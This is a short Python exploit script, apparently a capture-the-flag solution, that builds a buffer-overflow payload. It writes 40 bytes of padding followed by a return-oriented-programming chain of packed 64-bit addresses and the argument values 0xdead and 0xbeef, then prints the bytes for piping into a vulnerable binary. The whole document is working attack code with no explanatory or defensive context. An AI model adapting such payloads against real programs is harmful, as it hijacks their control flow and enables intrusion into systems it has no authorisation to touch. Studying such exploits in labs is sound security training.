import sys
import struct

payload  = b"A"*40
payload += struct.pack("<Q", 0x401146)
payload += struct.pack("<Q", 0xdead)
payload += struct.pack("<Q", 0x401149)
payload += struct.pack("<Q", 0xbeef)
payload += struct.pack("<Q", 0x40114c)

sys.stdout.buffer.write(payload)